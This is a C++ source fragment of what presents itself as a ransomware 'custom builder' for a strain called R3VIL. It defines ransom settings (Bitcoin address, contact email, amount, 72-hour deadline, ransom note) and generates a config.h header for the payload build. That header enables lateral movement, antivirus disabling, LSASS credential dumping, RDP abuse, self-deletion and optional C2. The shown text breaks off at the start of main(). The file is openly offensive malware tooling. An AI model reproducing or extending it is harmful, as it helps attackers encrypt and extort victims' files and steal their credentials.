namespace fs = std::filesystem;

struct RansomConfig {
    // Ransom Information
    std::string btc_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
    std::string email = "decrypt@onionmail.org";
    double ransom_amount = 500.0;
    int deadline_hours = 72;
    std::string ransom_message = "Your files have been encrypted with military grade encryption.";

    // GUI
    std::string window_title = "R3VIL Ransomware";

    // Encryption
    std::string encryption_method = "XChaCha20Poly1305";   // "XChaCha20Poly1305" atau "AES256CBC"

    // Custom Extension
    std::string file_extension = ".revil";

    // Output
    std::string output_name = "r3vil_custom.exe";

    // Behavior
    bool enable_lateral_movement = true;
    bool enable_av_disable = true;
    bool self_delete_after = true;

    // Advanced Features
    bool enable_lsass_dump = true;
    bool enable_rdp_abuse = true;

    // C2 Configuration
    std::string c2_server = "";
    bool enable_c2 = false;
};

void create_config_header(const RansomConfig& cfg) {
    std::ofstream out("config.h");
    if (!out.is_open()) {
        std::cout << "[✗] Gagal membuat config.h\n";
        return;
    }

    out << "// config.h - Generated by R3VIL Custom Builder\n";
    out << "#pragma once\n\n";

    out << "// === RANSOM INFORMATION ===\n";
    out << "const std::string RANSOM_BTC = \"" << cfg.btc_address << "\";\n";
    out << "const std::string RANSOM_EMAIL = \"" << cfg.email << "\";\n";
    out << "const double RANSOM_AMOUNT = " << cfg.ransom_amount << ";\n";
    out << "const int RANSOM_DEADLINE_HOURS = " << cfg.deadline_hours << ";\n";
    out << "const std::string RANSOM_MESSAGE = \"" << cfg.ransom_message << "\";\n\n";

    out << "// === GUI ===\n";
    out << "const std::string WINDOW_TITLE = \"" << cfg.window_title << "\";\n\n";

    out << "// === ENCRYPTION ===\n";
    out << "const std::string ENCRYPTION_METHOD = \"" << cfg.encryption_method << "\";\n";
    out << "const std::string FILE_EXTENSION = \"" << cfg.file_extension << "\";\n\n";

    out << "// === BEHAVIOR ===\n";
    out << "const std::string OUTPUT_NAME = \"" << cfg.output_name << "\";\n";
    out << "const bool ENABLE_LATERAL_MOVEMENT = " << (cfg.enable_lateral_movement ? "true" : "false") << ";\n";
    out << "const bool ENABLE_AV_DISABLE = " << (cfg.enable_av_disable ? "true" : "false") << ";\n";
    out << "const bool SELF_DELETE_AFTER = " << (cfg.self_delete_after ? "true" : "false") << ";\n\n";

    out << "// === ADVANCED LATERAL MOVEMENT ===\n";
    out << "const bool ENABLE_LSASS_DUMP = " << (cfg.enable_lsass_dump ? "true" : "false") << ";\n";
    out << "const bool ENABLE_RDP_ABUSE = " << (cfg.enable_rdp_abuse ? "true" : "false") << ";\n";

    out << "// === C2 CONFIGURATION ===\n";
    out << "const std::string C2_SERVER = \"" << cfg.c2_server << "\";\n";
    out << "const bool ENABLE_C2 = " << (cfg.enable_c2 ? "true" : "false") << ";\n";

    out.close();
    std::cout << "[✓] config.h berhasil dibuat\n";
}

int main() {
    std::cout << "\n========================================\n";
    std::cout << "     R3VIL Ransomware FULL CUSTOM BUILDER     \n";
    std::cout << "========================================\n\n";

